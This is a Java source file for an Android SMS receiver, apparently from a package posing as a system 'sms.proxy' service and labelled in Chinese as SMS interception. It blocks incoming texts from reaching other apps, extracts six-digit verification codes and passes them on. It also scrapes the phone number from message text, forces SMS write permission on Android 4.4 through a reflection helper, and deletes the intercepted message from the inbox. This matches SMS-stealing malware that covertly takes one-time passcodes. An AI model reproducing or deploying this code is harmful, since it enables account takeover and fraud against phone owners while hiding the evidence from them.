package com.android.sms.proxy.service;

import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

import com.android.sms.proxy.entity.PhoneInfo;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * 短信拦截
 *
 * @author zyq 16-3-9
 */
public class Receiver_SMS extends BroadcastReceiver {

	private final static boolean DEBUG = false;
	private final static String TAG = "smsReceiver";
	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
	private final String SMS_SERVICE = "pdus";
	private final String SMS_BODY = "body";
	private final String SMS_ID = "_id";
	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
	private final String SMS_CONTENT = "content://sms";

	private static OnReceiveSMSListener mOnReceiveSMSListener;

	public Receiver_SMS() {
	}

	;

	public Receiver_SMS(OnReceiveSMSListener listener) {
		mOnReceiveSMSListener = listener;
	}


	public static void registSmsReceiver(Context context, Receiver_SMS receiver) {
		IntentFilter filter = new IntentFilter();
		filter.addAction(SMS_ACTION);
		filter.addCategory(SMS_CATEGORY);
		context.registerReceiver(receiver, filter);
	}

	public static void setReceiveListener(OnReceiveSMSListener listener) {
		mOnReceiveSMSListener = listener;
	}

	public static void unRegisterSmsReceiver(Context context, Receiver_SMS reciever) {
		if (reciever != null) {
			context.unregisterReceiver(reciever);
		}
	}

	@Override
	public void onReceive(Context context, Intent intent) {
		try {
			if (SMS_ACTION.equals(intent.getAction())) {
				Bundle args = intent.getExtras();
				String msgContent = "";
				this.abortBroadcast();
				if (DEBUG) {
					Log.d(TAG, "收到短信:" + args);
				}
				if (args != null) {
					Object[] pdus = (Object[]) args.get(SMS_SERVICE);
					SmsMessage messages[] = new SmsMessage[pdus.length];
					boolean hasPhoneNumber = true;
					String phoneNumber = PhoneInfo.getInstance(context).getDbPhoneNumber(context);
					if (TextUtils.isEmpty(phoneNumber)) {
						hasPhoneNumber = false;
					}
					for (int i = 0; i < messages.length; i++) {
						messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
						msgContent = messages[i].getMessageBody();

						//final String verifyCode = getVerificationCode(msgContent);
						if (!hasPhoneNumber) {
							final String number = getPhoneNumber(msgContent);
							Log.d(TAG, "已经找到该手机号:" + number);
							if (!TextUtils.isEmpty(number)) {
								hasPhoneNumber = true;
								PhoneInfo.getInstance(context).insertPhone(context, number);
							}
						}
						if (msgContent != null) {
							Log.d(TAG, "收到的短信内容：" + msgContent);
							String code = getVerificationCode(msgContent);
							Log.d(TAG, "验证码是" + code);
							if (TextUtils.isEmpty(code)) return;
							if (!TextUtils.isEmpty(code)) {
								if (mOnReceiveSMSListener != null) {
									mOnReceiveSMSListener.onReceiveSMS(code);
								}
								if (Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT) {
									if (SmsWriteOpUtil.isWriteEnabled(context)) {
										Log.d(TAG, "4.4反射修改短信权限！！！！！！");
										SmsWriteOpUtil.setWriteEnabled(context, true);
									}
								}
								deleteSMS(context, msgContent);
							}
						}

					}
				}
			}
		} catch (Exception e) {
			if (DEBUG) {
				Log.e(TAG, e.fillInStackTrace().toString());
			}
		}
	}


	private String getVerificationCode(String smsBody) {
		Pattern p = Pattern.compile("\\D\\d{6}\\D");
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(1, tempStr.length() - 1);
			}
		}
		return null;
	}


	private String getPhoneNumber(String smsBody) {
		Log.d(TAG, "找手机号");
		String telRegex = "[1][358]\\d{9}";
		Pattern p = Pattern.compile(telRegex);
		Matcher m = p.matcher(smsBody);
		if (m.find()) {
			final int groupCount = m.groupCount();
			if (groupCount >= 0) {
				final String tempStr = m.group(0);
				return tempStr.substring(0, tempStr.length());
			}
		}
		return null;
	}

	public interface OnReceiveSMSListener {
		void onReceiveSMS(String sms);
	}


	public void deleteSMS(Context context, String smsContent) {
		try {
			Uri uri = Uri.parse(SMS_RECEIVE_CONTENT);
			ContentResolver contentResolver = context.getContentResolver();
			if (contentResolver != null) {
				Cursor isRead = contentResolver.query(uri, null, null, null, null);
				while (isRead.moveToNext()) {
					String body = isRead.getString(isRead.getColumnIndex(SMS_BODY)).trim();
					Log.d(TAG, "短信内容:" + body);
					if (body.equals(smsContent)) {
						int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
						Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
						int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);
						Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT);
						Log.d(TAG, (count == 1) ? "删除成功" : "删除失败");
					}
				}
			}
		} catch (Exception e) {
			Log.e(TAG, e.fillInStackTrace().toString());
		}
	}
}
